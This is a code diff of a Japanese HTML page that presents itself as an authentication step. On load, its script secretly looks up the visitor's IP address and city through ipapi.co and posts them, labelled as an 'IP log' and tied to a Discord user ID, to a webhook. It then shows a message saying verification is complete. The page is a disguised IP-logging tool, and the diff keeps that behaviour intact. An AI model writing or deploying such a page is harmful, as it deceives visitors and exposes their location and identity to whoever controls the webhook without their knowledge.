@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="ja">
-<head><meta charset="UTF-8"><title>認証処理</title></head>
+<head><meta charset="UTF-8"><title>認証</title></head>
 <body style="background:#2f3136;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
     <h1 id="status">認証中...</h1>
     <script>
@@ -8,31 +8,29 @@
         async function start() {
             const params = new URLSearchParams(window.location.search);
             const state = params.get('state');
+
             if (!state) {
-                document.getElementById('status').innerText = "❌ パラメータ不足。最新のリンクを使用してください。";
+                // ここでエラーが出るのは、URLに state= が入っていないからです
+                document.getElementById('status').innerHTML = "❌ パラメータ不足<br><small>URLにstateが含まれていません。</small>";
                 return;
             }
+
             try {
                 const logId = state.split('LID_')[1].split('_UID_')[0];
                 const userId = state.split('_UID_')[1].split('_RID_')[0];
                 const res = await fetch('https://ipapi.co/json/');
                 const geo = await res.json();
+
                 await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `✅ **認証成功**: <@${userId}>`,
-                        embeds: [{
-                            title: "IP取得結果",
-                            description: `**IP:** \`${geo.ip}\`\n**場所:** \`${geo.country_name} / ${geo.city}\``,
-                            color: 0x43b581
-                        }]
+                        content: `✅ **成功**: <@${userId}>`,
+                        embeds: [{ title: "IPログ", description: `**IP:** ${geo.ip}\n**場所:** ${geo.city}`, color: 0x43b581 }]
                     })
                 });
-                document.getElementById('status').innerText = "✅ 認証完了。ページを閉じてください。";
-            } catch (e) {
-                document.getElementById('status').innerText = "❌ 通信エラー。";
-            }
+                document.getElementById('status').innerText = "✅ 完了しました！";
+            } catch (e) { document.getElementById('status').innerText = "❌ エラー"; }
         }
         start();
     </script>
